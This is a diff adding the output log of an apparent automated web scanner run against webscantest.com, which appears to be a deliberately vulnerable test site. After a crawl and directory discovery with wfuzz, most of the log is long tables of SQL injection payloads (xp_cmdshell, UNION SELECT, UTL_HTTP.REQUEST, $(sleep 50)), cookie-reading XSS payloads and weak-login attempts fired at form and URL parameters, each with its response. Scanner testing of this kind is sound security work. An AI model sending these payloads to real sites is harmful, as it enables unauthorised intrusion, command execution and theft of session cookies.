@@ -1,0 +1,492 @@
+Scraping from http://www.webscantest.com/
+no action on http://www.webscantest.com/
+Scraping from http://www.webscantest.com/jsmenugotoajax.php
+Scraping from http://www.webscantest.com/angular
+Scraping from http://www.webscantest.com/jsmenudynalink_rfplaces.php
+Scraping from http://www.webscantest.com/gonowhere
+Scraping from http://www.webscantest.com/privacy.php
+Scraping from http://www.webscantest.com/static
+Scraping from http://www.webscantest.com/jsmenudynalink_myfiles.php
+Scraping from http://www.webscantest.com/jsmenucookie_set_coffeepits.php
+Scraping from http://www.webscantest.com/restdemo
+Scraping from http://www.webscantest.com/corscors.php
+Scraping from http://www.webscantest.com/jsmenuauto_shutterdb.php
+Scraping from http://www.webscantest.com/xmldbindex.php
+Scraping from http://www.webscantest.com/jsmenugotoframeme.php?foo%3D0+bar%3D+url%3Dhttps%3A%2F%2Fauth.ntobjectives.com+dr%3Dsomedir
+Scraping from http://www.webscantest.com/jsmenuauto_crosstraining.php
+Scraping from http://www.webscantest.com/login.php
+Scraping from http://www.webscantest.com/soapdemo
+Scraping from http://www.webscantest.com/csrf
+Scraping from http://www.webscantest.com/business
+Scraping from http://www.webscantest.com/infodbindex.php
+Scraping from http://www.webscantest.com/jsmenuauto_datastore.php
+Scraping from http://www.webscantest.com/jsmenuauto_osrun.php
+Scraping from http://www.webscantest.com/reactindex
+Scraping from http://www.webscantest.com/static/product16.html
+Scraping from http://www.webscantest.com/static/product32.html
+Scraping from http://www.webscantest.com/static/product19.html
+Scraping from http://www.webscantest.com/static/product34.html
+Scraping from http://www.webscantest.com/static/product27.html
+Scraping from http://www.webscantest.com/static/product29.html
+Scraping from http://www.webscantest.com/static/product41.html
+Scraping from http://www.webscantest.com/static/product1.html
+Scraping from http://www.webscantest.com/static/product26.html
+Scraping from http://www.webscantest.com/static/product37.html
+Scraping from http://www.webscantest.com/static/product4.html
+Scraping from http://www.webscantest.com/csrf/csrfpost.php
+no action on http://www.webscantest.com/csrf/csrfpost.php/
+Scraping from http://www.webscantest.com/static/product50.html
+Scraping from http://www.webscantest.com/static/product8.html
+Scraping from http://www.webscantest.com/static/product7.html
+Scraping from http://www.webscantest.com/static/product10.html
+Scraping from http://www.webscantest.com/static/product25.html
+Scraping from http://www.webscantest.com/static/product49.html
+Scraping from http://www.webscantest.com/static/product35.html
+Scraping from http://www.webscantest.com/static/product2.html
+Scraping from http://www.webscantest.com/static/product3.html
+Scraping from http://www.webscantest.com/static/product42.html
+Scraping from http://www.webscantest.com/angular/.angular1index.html
+Scraping from http://www.webscantest.com/static/product12.html
+Scraping from http://www.webscantest.com/static/product17.html
+Scraping from http://www.webscantest.com/static/product9.html
+Scraping from http://www.webscantest.com/static/product22.html
+Scraping from http://www.webscantest.com/static/product6.html
+Scraping from http://www.webscantest.com/static/product15.html
+Scraping from http://www.webscantest.com/static/product21.html
+Scraping from http://www.webscantest.com/static/product11.html
+Scraping from http://www.webscantest.com/static/product36.html
+Scraping from http://www.webscantest.com/static/product44.html
+Scraping from http://www.webscantest.com/csrf/redirect.php
+no action on http://www.webscantest.com/csrf/redirect.php/
+Scraping from http://www.webscantest.com/static/product24.html
+Scraping from http://www.webscantest.com/static/product38.html
+Scraping from http://www.webscantest.com/static/product43.html
+Scraping from http://www.webscantest.com/static/product47.html
+Scraping from http://www.webscantest.com/static/product13.html
+Scraping from http://www.webscantest.com/static/product14.html
+Scraping from http://www.webscantest.com/static/product5.html
+Scraping from http://www.webscantest.com/static/product18.html
+Scraping from http://www.webscantest.com/static/product31.html
+Scraping from http://www.webscantest.com/static/product33.html
+Scraping from http://www.webscantest.com/static/product40.html
+Scraping from http://www.webscantest.com/static/product48.html
+Scraping from http://www.webscantest.com/csrf/session.php
+Scraping from http://www.webscantest.com/static/product45.html
+Scraping from http://www.webscantest.com/static/product46.html
+Scraping from http://www.webscantest.com/static/product28.html
+Scraping from http://www.webscantest.com/csrf/token.php
+no action on http://www.webscantest.com/csrf/token.php/
+Scraping from http://www.webscantest.com/static/product23.html
+Scraping from http://www.webscantest.com/csrf/aspnetSetCookie.php
+Scraping from http://www.webscantest.com/static/product30.html
+Scraping from http://www.webscantest.com/static/product39.html
+Scraping from http://www.webscantest.com/static/product20.html
+Scraping from http://www.webscantest.com/csrf/aspnetSetCookie.php/aspnetsimulate.php
+
+The found urls, corresponding url parameters and POST parameters.
+http://www.webscantest.com [] []
+http://www.webscantest.com/login.php [] ['login', 'passwd', 'submit_login']
+http://www.webscantest.com/csrf/csrfpost.php [] ['property']
+http://www.webscantest.com/csrf/redirect.php [] ['property', 'token']
+http://www.webscantest.com/csrf/token.php [] ['property', 'csrf_token']
+http://www.webscantest.com/imagesbouncingmike.jpg ['a'] []
+http://www.webscantest.com/business/quantity.php ['quantity'] []
+http://www.webscantest.com/business/privilege.php ['admin'] []
+http://www.webscantest.com/business/access.php ['serviceid'] []
+http://www.webscantest.com/business/account.php ['accountId'] []
+http://www.webscantest.com/csrf/session.php/session.php ['jsession'] []
+
+WFuzz -- common directories, URL = http://www.webscantest.com/
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /Users/maxinyi/anaconda3/lib/python3.7/site-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /Users/maxinyi/anaconda3/lib/python3.7/site-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            301            9 L      28      328         None    http://www.webscantest.com/business
+        2            301            9 L      28      324         None    http://www.webscantest.com/cart
+        3            301            9 L      28      323         None    http://www.webscantest.com/css
+        4            301            9 L      28      325         None    http://www.webscantest.com/icons
+        5            301            9 L      28      326         None    http://www.webscantest.com/images
+
+WFuzz -- common files, URL = http://www.webscantest.com/
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           38 L     121     1486         None    http://www.webscantest.com/config.php
+        2            200            0 L       0        0         None    http://www.webscantest.com/cron.php
+        3            200           35 L      92     1271         None    http://www.webscantest.com/framework.php
+        4            200          109 L     355     5190         None    http://www.webscantest.com/index.php
+        5            200           48 L     122     1596         None    http://www.webscantest.com/login.php
+        6            302            0 L       0        0         None    http://www.webscantest.com/logout.php
+
+Found hidden URLs:
+http://www.webscantest.com/business/
+http://www.webscantest.com/cart/
+http://www.webscantest.com/css/
+http://www.webscantest.com/icons/
+http://www.webscantest.com/images/
+http://www.webscantest.com/report/
+http://www.webscantest.com/soap/
+http://www.webscantest.com/ssi/
+http://www.webscantest.com/config.php
+http://www.webscantest.com/cron.php
+http://www.webscantest.com/framework.php
+http://www.webscantest.com/functions.php
+http://www.webscantest.com/index.php
+login.php
+http://www.webscantest.com/session.php
+
+Perform Fuzzing on the Found URLs....
+
+WFuzz -- Weak Username and password, URL = http://www.webscantest.com/login.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200           48 L     122     1596         None    http://www.webscantest.com/login.php    login=&passwd=&submit_login=Login
+        2            302            0 L       0        0         None    http://www.webscantest.com/login.php    login=asdf123&passwd=asdf123&submit_login=Login
+
+WFuzz -- SQL Injection on POST parameters, URL = http://www.webscantest.com/login.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            302            0 L       0        0         None    http://www.webscantest.com/login.php    login='%20--&passwd='%20--&submit_login=Login
+        2            200           48 L     122     1596         None    http://www.webscantest.com/login.php    login=&lt;&gt;&quot;'%;)(&amp;+&passwd=&lt;&gt;&quot;'%;)(&amp;+&submit_login=Login
+
+WFuzz -- SQL Injection on POST parameters, URL = http://www.webscantest.com/csrf/csrfpost.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200           35 L      96     1286         None    http://www.webscantest.com/csrf/csrfpost.php    property==%20'
+        2            200           35 L      95     1284         None    http://www.webscantest.com/csrf/csrfpost.php    property=#
+        3            200           35 L      95     1285         None    http://www.webscantest.com/csrf/csrfpost.php    property=--
+        4            200           35 L      95     1287         None    http://www.webscantest.com/csrf/csrfpost.php    property=--';
+        5            200           35 L      96     1287         None    http://www.webscantest.com/csrf/csrfpost.php    property='%20--
+        6            200           35 L      97     1304         None    http://www.webscantest.com/csrf/csrfpost.php    property=\x27\x4F\x52 SELECT *
+        7            200           35 L      96     1293         None    http://www.webscantest.com/csrf/csrfpost.php    property=\x3D%20\x3B'
+        8            200           35 L      95     1291         None    http://www.webscantest.com/csrf/csrfpost.php    property=admin'--
+        9            200           35 L      96     1292         None    http://www.webscantest.com/csrf/csrfpost.php    property=\x3D%20\x27
+       10            200           35 L      97     1295         None    http://www.webscantest.com/csrf/csrfpost.php    property='or%20select *
+       11            200           35 L      97     1294         None    http://www.webscantest.com/csrf/csrfpost.php    property='%20or%20'x'='x
+       12            200           35 L      97     1292         None    http://www.webscantest.com/csrf/csrfpost.php    property='%20or%20''='
+       13            200           35 L      97     1296         None    http://www.webscantest.com/csrf/csrfpost.php    property=')%20or%20('x'='x
+       14            200           35 L      98     1293         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or 0=0 #
+       15            200           35 L      97     1291         None    http://www.webscantest.com/csrf/csrfpost.php    property=0 or 1=1
+       16            200           35 L      98     1294         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or 0=0 --
+       17            200           35 L      97     1293         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or 1=1--
+       18            200           35 L      97     1297         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or '1'='1'--
+       19            200           35 L      99     1299         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or 1=1 or ''='
+       20            200           35 L      96     1291         None    http://www.webscantest.com/csrf/csrfpost.php    property=or 1=1--
+       21            200           35 L      98     1295         None    http://www.webscantest.com/csrf/csrfpost.php    property="' or 1 --'"
+       22            200           35 L      96     1289         None    http://www.webscantest.com/csrf/csrfpost.php    property=or%201=1
+       23            200           35 L      97     1298         None    http://www.webscantest.com/csrf/csrfpost.php    property=hi') or ('a'='a
+       24            200           35 L      98     1296         None    http://www.webscantest.com/csrf/csrfpost.php    property=hi' or 1=1 --
+       25            200           35 L      97     1299         None    http://www.webscantest.com/csrf/csrfpost.php    property='hi' or 'x'='x';
+       26            200           35 L      95     1292         None    http://www.webscantest.com/csrf/csrfpost.php    property=@variable
+       27            200           35 L      95     1288         None    http://www.webscantest.com/csrf/csrfpost.php    property=PRINT
+       28            200           35 L      95     1293         None    http://www.webscantest.com/csrf/csrfpost.php    property=,@variable
+       29            200           35 L      96     1299         None    http://www.webscantest.com/csrf/csrfpost.php    property=PRINT @@variable
+       30            200           35 L      95     1289         None    http://www.webscantest.com/csrf/csrfpost.php    property=insert
+       31            200           35 L      95     1286         None    http://www.webscantest.com/csrf/csrfpost.php    property=asc
+       32            200           35 L      95     1290         None    http://www.webscantest.com/csrf/csrfpost.php    property=replace
+       33            200           35 L      99     1304         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or username like '%
+       34            200           35 L      99     1301         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or uname like '%
+       35            200           35 L      99     1302         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or userid like '%
+       36            200           35 L      99     1300         None    http://www.webscantest.com/csrf/csrfpost.php    property=' or user like '%
+       37            200           35 L      96     1290         None    http://www.webscantest.com/csrf/csrfpost.php    property=exec xp
+       38            200           35 L      97     1310         None    http://www.webscantest.com/csrf/csrfpost.php    property='; exec master..xp_cmdshell
+       39            200           35 L      95     1296         None    http://www.webscantest.com/csrf/csrfpost.php    property=--sp_password
+       40            200           35 L      98     1337         None    http://www.webscantest.com/csrf/csrfpost.php    property=t'exec master..xp_cmdshell 'nslookup www.google.com'--
+       41            200           35 L      97     1301         None    http://www.webscantest.com/csrf/csrfpost.php    property='; exec xp_regread
+       42            200           35 L      98     1298         None    http://www.webscantest.com/csrf/csrfpost.php    property=' (select top 1
+       43            200           35 L      98     1301         None    http://www.webscantest.com/csrf/csrfpost.php    property=' UNION ALL SELECT
+       44            200           35 L      95     1302         None    http://www.webscantest.com/csrf/csrfpost.php    property='||UTL_HTTP.REQUEST
+       45            200           35 L      95     1298         None    http://www.webscantest.com/csrf/csrfpost.php    property=to_timestamp_tz
+       46            200           35 L      94     1283         None    http://www.webscantest.com/csrf/csrfpost.php    property=&lt;&gt;&quot;'%;)(&amp;+
+       47            200           35 L      96     1295         None    http://www.webscantest.com/csrf/csrfpost.php    property=%20$(sleep%2050)
+       48            200           35 L      95     1295         None    http://www.webscantest.com/csrf/csrfpost.php    property='sqlattempt1
+       49            200           35 L      96     1294         None    http://www.webscantest.com/csrf/csrfpost.php    property=%20'sleep%2050'
+       50            200           35 L      95     1299         None    http://www.webscantest.com/csrf/csrfpost.php    property=char%4039%41%2b%40SELECT
+
+WFuzz -- SQL Injection on POST parameters, URL = http://www.webscantest.com/csrf/redirect.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            302           35 L      92     1271         None    http://www.webscantest.com/csrf/redirect.php    property="&token="
+
+WFuzz -- SQL Injection on POST parameters, URL = http://www.webscantest.com/csrf/token.php
+=======================================================================================================================================
+ClusterID        Response        Lines    Words   Chars   Error  URL                                             Post Payload
+=======================================================================================================================================
+        1            200           36 L      98     1296         None    http://www.webscantest.com/csrf/token.php       property='&csrf_token='
+        2            200           36 L     100     1300         None    http://www.webscantest.com/csrf/token.php       property==%20'&csrf_token==%20'
+        3            200           36 L      98     1298         None    http://www.webscantest.com/csrf/token.php       property=--&csrf_token=--
+        4            200           36 L     100     1302         None    http://www.webscantest.com/csrf/token.php       property='%20--&csrf_token='%20--
+        5            200           36 L      98     1302         None    http://www.webscantest.com/csrf/token.php       property=--';&csrf_token=--';
+        6            200           36 L      98     1310         None    http://www.webscantest.com/csrf/token.php       property=admin'--&csrf_token=admin'--
+        7            200           36 L     102     1336         None    http://www.webscantest.com/csrf/token.php       property=\x27\x4F\x52 SELECT *&csrf_token=\x27\x4F\x52 SELECT *
+        8            200           36 L     100     1314         None    http://www.webscantest.com/csrf/token.php       property=\x3D%20\x3B'&csrf_token=\x3D%20\x3B'
+        9            200           36 L     100     1312         None    http://www.webscantest.com/csrf/token.php       property=\x3D%20\x27&csrf_token=\x3D%20\x27
+       10            200           36 L     102     1318         None    http://www.webscantest.com/csrf/token.php       property='or%20select *&csrf_token='or%20select *
+       11            200           36 L     102     1312         None    http://www.webscantest.com/csrf/token.php       property='%20or%20''='&csrf_token='%20or%20''='
+       12            200           36 L     102     1316         None    http://www.webscantest.com/csrf/token.php       property='%20or%20'x'='x&csrf_token='%20or%20'x'='x
+       13            200           36 L     102     1320         None    http://www.webscantest.com/csrf/token.php       property=')%20or%20('x'='x&csrf_token=')%20or%20('x'='x
+       14            200           36 L     104     1316         None    http://www.webscantest.com/csrf/token.php       property=' or 0=0 --&csrf_token=' or 0=0 --
+       15            200           36 L     102     1310         None    http://www.webscantest.com/csrf/token.php       property=0 or 1=1&csrf_token=0 or 1=1
+       16            200           36 L     104     1314         None    http://www.webscantest.com/csrf/token.php       property=' or 0=0 #&csrf_token=' or 0=0 #
+       17            200           36 L     102     1314         None    http://www.webscantest.com/csrf/token.php       property=' or 1=1--&csrf_token=' or 1=1--
+       18            200           36 L     102     1322         None    http://www.webscantest.com/csrf/token.php       property=' or '1'='1'--&csrf_token=' or '1'='1'--
+       19            200           36 L     104     1318         None    http://www.webscantest.com/csrf/token.php       property="' or 1 --'"&csrf_token="' or 1 --'"
+       20            200           36 L     106     1326         None    http://www.webscantest.com/csrf/token.php       property=' or 1=1 or ''='&csrf_token=' or 1=1 or ''='
+       21            200           36 L     100     1306         None    http://www.webscantest.com/csrf/token.php       property=or%201=1&csrf_token=or%201=1
+       22            200           36 L     100     1310         None    http://www.webscantest.com/csrf/token.php       property=or 1=1--&csrf_token=or 1=1--
+       23            200           36 L     102     1324         None    http://www.webscantest.com/csrf/token.php       property=hi') or ('a'='a&csrf_token=hi') or ('a'='a
+       24            200           36 L     104     1320         None    http://www.webscantest.com/csrf/token.php       property=hi" or 1=1 --&csrf_token=hi" or 1=1 --
+       25            200           36 L     102     1326         None    http://www.webscantest.com/csrf/token.php       property='hi' or 'x'='x';&csrf_token='hi' or 'x'='x';
+       26            200           36 L      98     1314         None    http://www.webscantest.com/csrf/token.php       property=,@variable&csrf_token=,@variable
+       27            200           36 L      98     1312         None    http://www.webscantest.com/csrf/token.php       property=@variable&csrf_token=@variable
+       28            200           36 L      98     1304         None    http://www.webscantest.com/csrf/token.php       property=PRINT&csrf_token=PRINT
+       29            200           36 L     100     1326         None    http://www.webscantest.com/csrf/token.php       property=PRINT @@variable&csrf_token=PRINT @@variable
+       30            200           36 L      98     1306         None    http://www.webscantest.com/csrf/token.php       property=select&csrf_token=select
+       31            200           36 L      98     1300         None    http://www.webscantest.com/csrf/token.php       property=asc&csrf_token=asc
+       32            200           36 L      98     1308         None    http://www.webscantest.com/csrf/token.php       property=replace&csrf_token=replace
+       33            200           36 L     106     1336         None    http://www.webscantest.com/csrf/token.php       property=' or username like '%&csrf_token=' or username like '%
+       34            200           36 L     106     1330         None    http://www.webscantest.com/csrf/token.php       property=' or uname like '%&csrf_token=' or uname like '%
+       35            200           36 L     106     1332         None    http://www.webscantest.com/csrf/token.php       property=' or userid like '%&csrf_token=' or userid like '%
+       36            200           36 L     106     1328         None    http://www.webscantest.com/csrf/token.php       property=' or user like '%&csrf_token=' or user like '%
+       37            200           36 L     102     1348         None    http://www.webscantest.com/csrf/token.php       property='; exec master..xp_cmdshell&csrf_token='; exec master..xp_cmdshell
+       38            200           36 L     100     1308         None    http://www.webscantest.com/csrf/token.php       property=exec xp&csrf_token=exec xp
+       39            200           36 L     102     1330         None    http://www.webscantest.com/csrf/token.php       property='; exec xp_regread&csrf_token='; exec xp_regread
+       40            200           36 L     104     1402         None    http://www.webscantest.com/csrf/token.php       property=t'exec master..xp_cmdshell 'nslookup www.google.com'--&csrf_token=t'exec master..xp_cmdshell 'nslookup www.google.com'--
+       41            200           36 L      98     1320         None    http://www.webscantest.com/csrf/token.php       property=--sp_password&csrf_token=--sp_password
+       42            200           36 L     104     1330         None    http://www.webscantest.com/csrf/token.php       property=' UNION ALL SELECT&csrf_token=' UNION ALL SELECT
+       43            200           36 L     104     1324         None    http://www.webscantest.com/csrf/token.php       property=' (select top 1&csrf_token=' (select top 1
+       44            200           36 L      98     1332         None    http://www.webscantest.com/csrf/token.php       property='||UTL_HTTP.REQUEST&csrf_token='||UTL_HTTP.REQUEST
+       45            200           36 L     100     1318         None    http://www.webscantest.com/csrf/token.php       property=%20$(sleep%2050)&csrf_token=%20$(sleep%2050)
+       46            200           36 L      98     1324         None    http://www.webscantest.com/csrf/token.php       property=to_timestamp_tz&csrf_token=to_timestamp_tz
+       47            200           36 L      96     1294         None    http://www.webscantest.com/csrf/token.php       property=&lt;&gt;&quot;'%;)(&amp;+&csrf_token=&lt;&gt;&quot;'%;)(&amp;+
+       48            200           36 L     100     1316         None    http://www.webscantest.com/csrf/token.php       property=%20'sleep%2050'&csrf_token=%20'sleep%2050'
+       49            200           36 L      98     1326         None    http://www.webscantest.com/csrf/token.php       property=char%4039%41%2b%40SELECT&csrf_token=char%4039%41%2b%40SELECT
+       50            200           36 L      98     1318         None    http://www.webscantest.com/csrf/token.php       property='sqlattempt1&csrf_token='sqlattempt1
+
+WFuzz -- SQL Injection on URL parameters, URL = http://www.webscantest.com/imagesbouncingmike.jpg
+
+WFuzz -- XSS Injection, URL = http://www.webscantest.com/imagesbouncingmike.jpg
+
+WFuzz -- SQL Injection on URL parameters, URL = http://www.webscantest.com/business/quantity.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     102     1367         None    http://www.webscantest.com/business/quantity.php?quantity=
+        2            200           35 L     103     1384         None    http://www.webscantest.com/business/quantity.php?quantity=-
+
+WFuzz -- XSS Injection, URL = http://www.webscantest.com/business/quantity.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     103     1384         None    http://www.webscantest.com/business/quantity.php?quantity=<<script>alert("WXSS");//<</script>
+        2            200           35 L     102     1367         None    http://www.webscantest.com/business/quantity.php?quantity=&ltscript&gtalert(document.cookie);</script>
+
+WFuzz -- SQL Injection on URL parameters, URL = http://www.webscantest.com/business/privilege.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     107     1412         None    http://www.webscantest.com/business/privilege.php?admin="
+
+WFuzz -- XSS Injection, URL = http://www.webscantest.com/business/privilege.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     107     1412         None    http://www.webscantest.com/business/privilege.php?admin=<<script>alert("WXSS");//<</script>
+
+WFuzz -- SQL Injection on URL parameters, URL = http://www.webscantest.com/business/access.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     101     1362         None    http://www.webscantest.com/business/access.php?serviceid="
+        2            200           35 L     105     1384         None    http://www.webscantest.com/business/access.php?serviceid=
+
+WFuzz -- XSS Injection, URL = http://www.webscantest.com/business/access.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     101     1362         None    http://www.webscantest.com/business/access.php?serviceid='><script>alert(document.cookie);</script>
+        2            200           35 L     105     1384         None    http://www.webscantest.com/business/access.php?serviceid=&ltscript&gtalert(document.cookie);</script>
+
+WFuzz -- SQL Injection on URL parameters, URL = http://www.webscantest.com/business/account.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     102     1367         None    http://www.webscantest.com/business/account.php?accountId=--
+        2            200           35 L     102     1366         None    http://www.webscantest.com/business/account.php?accountId='
+        3            200           35 L     106     1386         None    http://www.webscantest.com/business/account.php?accountId=
+        4            200           35 L     103     1368         None    http://www.webscantest.com/business/account.php?accountId==%20'
+        5            200           35 L     103     1369         None    http://www.webscantest.com/business/account.php?accountId='%20--
+        6            200           35 L     102     1369         None    http://www.webscantest.com/business/account.php?accountId=--';
+        7            200           35 L     103     1375         None    http://www.webscantest.com/business/account.php?accountId=\x3D%20\x3B'
+        8            200           35 L     103     1374         None    http://www.webscantest.com/business/account.php?accountId=\x3D%20\x27
+        9            200           35 L     104     1386         None    http://www.webscantest.com/business/account.php?accountId=\x27\x4F\x52%20SELECT%20*
+       10            200           35 L     104     1377         None    http://www.webscantest.com/business/account.php?accountId='or%20select%20*
+       11            200           35 L     102     1373         None    http://www.webscantest.com/business/account.php?accountId=admin'--
+       12            200           35 L     104     1376         None    http://www.webscantest.com/business/account.php?accountId='%20or%20'x'='x
+       13            200           35 L     104     1374         None    http://www.webscantest.com/business/account.php?accountId='%20or%20''='
+       14            200           35 L     105     1376         None    http://www.webscantest.com/business/account.php?accountId='%20or%200=0%20--
+       15            200           35 L     105     1374         None    http://www.webscantest.com/business/account.php?accountId='%20or%200=0%20
+       16            200           35 L     104     1378         None    http://www.webscantest.com/business/account.php?accountId=')%20or%20('x'='x
+       17            200           35 L     104     1373         None    http://www.webscantest.com/business/account.php?accountId=0%20or%201=1
+       18            200           35 L     104     1372         None    http://www.webscantest.com/business/account.php?accountId=or%200=0%20
+       19            200           35 L     104     1375         None    http://www.webscantest.com/business/account.php?accountId='%20or%201=1--
+       20            200           35 L     104     1379         None    http://www.webscantest.com/business/account.php?accountId='%20or%20'1'='1'--
+       21            200           35 L     106     1381         None    http://www.webscantest.com/business/account.php?accountId='%20or%201=1%20or%20''='
+       22            200           35 L     105     1377         None    http://www.webscantest.com/business/account.php?accountId="'%20or%201%20--'"
+       23            200           35 L     103     1371         None    http://www.webscantest.com/business/account.php?accountId=or%201=1
+       24            200           35 L     103     1373         None    http://www.webscantest.com/business/account.php?accountId=or%201=1--
+       25            200           35 L     104     1380         None    http://www.webscantest.com/business/account.php?accountId=hi')%20or%20('a'='a
+       26            200           35 L     105     1378         None    http://www.webscantest.com/business/account.php?accountId=hi"%20or%201=1%20--
+       27            200           35 L     102     1374         None    http://www.webscantest.com/business/account.php?accountId=@variable
+       28            200           35 L     104     1381         None    http://www.webscantest.com/business/account.php?accountId='hi'%20or%20'x'='x';
+       29            200           35 L     102     1375         None    http://www.webscantest.com/business/account.php?accountId=,@variable
+       30            200           35 L     102     1371         None    http://www.webscantest.com/business/account.php?accountId=select
+       31            200           35 L     102     1370         None    http://www.webscantest.com/business/account.php?accountId=PRINT
+       32            200           35 L     103     1381         None    http://www.webscantest.com/business/account.php?accountId=PRINT%20@@variable
+       33            200           35 L     102     1368         None    http://www.webscantest.com/business/account.php?accountId=asc
+       34            200           35 L     102     1372         None    http://www.webscantest.com/business/account.php?accountId=replace
+       35            200           35 L     106     1384         None    http://www.webscantest.com/business/account.php?accountId='%20or%20userid%20like%20'%
+       36            200           35 L     106     1383         None    http://www.webscantest.com/business/account.php?accountId='%20or%20uname%20like%20'%
+       37            200           35 L     106     1382         None    http://www.webscantest.com/business/account.php?accountId='%20or%20user%20like%20'%
+       38            200           35 L     103     1372         None    http://www.webscantest.com/business/account.php?accountId=exec%20xp
+       39            200           35 L     104     1392         None    http://www.webscantest.com/business/account.php?accountId=';%20exec%20master..xp_cmdshell
+       40            200           35 L     105     1419         None    http://www.webscantest.com/business/account.php?accountId=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'--
+       41            200           35 L     104     1383         None    http://www.webscantest.com/business/account.php?accountId=';%20exec%20xp_regread
+       42            200           35 L     102     1378         None    http://www.webscantest.com/business/account.php?accountId=--sp_password
+       43            200           35 L     105     1383         None    http://www.webscantest.com/business/account.php?accountId='%20UNION%20ALL%20SELECT
+       44            200           35 L     105     1380         None    http://www.webscantest.com/business/account.php?accountId='%20(select%20top%201
+       45            200           35 L     102     1384         None    http://www.webscantest.com/business/account.php?accountId='||UTL_HTTP.REQUEST
+       46            200           35 L     102     1380         None    http://www.webscantest.com/business/account.php?accountId=to_timestamp_tz
+       47            200           35 L     103     1377         None    http://www.webscantest.com/business/account.php?accountId=%20$(sleep%2050)
+       48            200           35 L     103     1376         None    http://www.webscantest.com/business/account.php?accountId=%20'sleep%2050'
+       49            200           35 L     102     1381         None    http://www.webscantest.com/business/account.php?accountId=char%4039%41%2b%40SELECT
+       50            200           35 L     102     1377         None    http://www.webscantest.com/business/account.php?accountId='sqlattempt1
+
+WFuzz -- XSS Injection, URL = http://www.webscantest.com/business/account.php
+=======================================================================================================================================
+ClusterID        Response         Lines  Words    Chars         Error    URL
+=======================================================================================================================================
+        1            200           35 L     102     1407         None    http://www.webscantest.com/business/account.php?accountId='><script>alert(document.cookie);</script>
+        2            200           35 L     102     1376         None    http://www.webscantest.com/business/account.php?accountId="><script>"
+        3            200           35 L     102     1395         None    http://www.webscantest.com/business/account.php?accountId=<script>alert("WXSS")</script>
+        4            200           35 L     102     1400         None    http://www.webscantest.com/business/account.php?accountId=<<script>alert("WXSS");//<</script>
+        5            200           35 L     102     1404         None    http://www.webscantest.com/business/account.php?accountId=<script>alert(document.cookie)</script>
+        6            200           35 L     102     1406         None    http://www.webscantest.com/business/account.php?accountId='><script>alert(document.cookie)</script>
+        7            200           35 L     102     1383         None    http://www.webscantest.com/business/account.php?accountId=\";alert('XSS');//
+        8            200           35 L     102     1405         None    http://www.webscantest.com/business/account.php?accountId=%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+        9            200           35 L     103     1396         None    http://www.webscantest.com/business/account.php?accountId=%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+       10            200           35 L     102     1396         None    http://www.webscantest.com/business/account.php?accountId=%3cscript%3ealert("WXSS");%3c/script%3e
+       11            200           35 L     102     1413         None    http://www.webscantest.com/business/account.php?accountId=<xss><script>alert('WXSS')</script></vulnerable>
+       12            200           35 L     103     1402         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC="javascript:alert('WXSS');">
+       13            200           35 L     103     1410         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC='javascript:alert(document.cookie)'>
+       14            200           35 L     106     1386         None    http://www.webscantest.com/business/account.php?accountId=&ltscript&gtalert(document.cookie);</script>
+       15            200           35 L     103     1400         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC="javascript:alert('WXSS')"
+       16            200           35 L     103     1399         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC=javascript:alert('WXSS')>
+       17            200           35 L     103     1391         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+       18            200           35 L     103     1403         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC=`javascript:alert("'WXSS'")`>
+       19            200           35 L     103     1422         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+       20            200           35 L     103     1406         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+       21            200           35 L     103     1378         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20SRC="jav
+       22            200           35 L     103     1404         None    http://www.webscantest.com/business/account.php?accountId=<IMG%20DYNSRC="javascript:alert('WXSS')">
